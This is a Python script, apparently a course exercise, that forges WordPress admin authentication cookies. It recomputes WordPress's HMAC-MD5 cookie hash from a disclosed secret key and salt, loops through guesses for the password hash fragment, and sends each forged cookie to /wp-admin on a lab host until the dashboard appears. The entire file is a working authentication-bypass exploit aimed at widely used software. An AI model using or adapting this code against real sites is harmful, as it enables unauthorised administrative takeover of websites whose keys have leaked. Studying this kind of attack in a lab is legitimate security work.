#!/usr/bin/python

from bs4 import BeautifulSoup
import hmac, hashlib, string, sys, getopt, httplib2, urllib

def wp_request(cookie_val, fragment):

	http = httplib2.Http()

	headers = {'Cookie':cookie_val,'User-Agent': 'Josh'}

	response, content = http.request('http://csc842.local/wp-admin', 'GET',headers=headers)

	soup = BeautifulSoup(content,'html.parser')

	if "Dashboard" in soup.title.string:
		print "[*] TOKEN FOUND: %s %s - %s - Using Cookie: %s" % (fragment, response['status'], soup.title, cookie_val)

# generate an md5 hash with salt in same manner as WP (see pluggable.php)
def wp_hash(data, key, salt):
	wpsalt = key + salt
	hash =  hmac.new(wpsalt, data, hashlib.md5).hexdigest()
	return hash

# generate array of all 4 character password frags given a range of
# upper and lower case letters numbers 0-9, slash (/) and period (.)
def gen_password_fragments():

	lowerletters = list(map(chr, range(ord('a'), ord('z')+1)))
	upperletters = list(map(chr, range(ord('A'), ord('Z')+1)))
	numbers = list(map(chr, range(ord('0'), ord('9')+1)))
	specchars = ['/', '.'];
	allchars = lowerletters #+ upperletters + numbers + specchars
	fragments = ""

	for letter in allchars:
		#@TODO: change this if you want to generate more combos
		fragments += ('a7O'+letter+',')

	fragments = fragments.rstrip(',') # remove trailing comma
	return fragments.split(','); # split list into an array for iteration

# generate all possible cookies for a given user
def gen_cookies(username, expiration, key, salt, target):
	fragments = gen_password_fragments()

	cookie_id = 'wordpress_' + hashlib.md5(target).hexdigest() + '='

	# loop through each generated pass frag and build key/hash/cookie
	for fragment in fragments:
		hashkey = wp_hash(username + fragment + '|' + expiration, key, salt)
		hashval = hmac.new(hashkey, username + '|' + expiration, hashlib.md5).hexdigest()
		cookie =  cookie_id + username + '%7C' + expiration + '%7C' + hashval

		#make the request
		wp_request(cookie, fragment)

	print ('\n[+] Attack Complete');

def main(argv):
	username = 'admin'
	expiration = '1577836800' # default expiration date (1/1/2020)
	key = 'DisclosedKey'
	salt = 'DisclosedSalt'
	target = 'http://csc842.local'

	gen_cookies(username, expiration,key, salt, target)

if __name__ == '__main__':
	main(sys.argv[1:])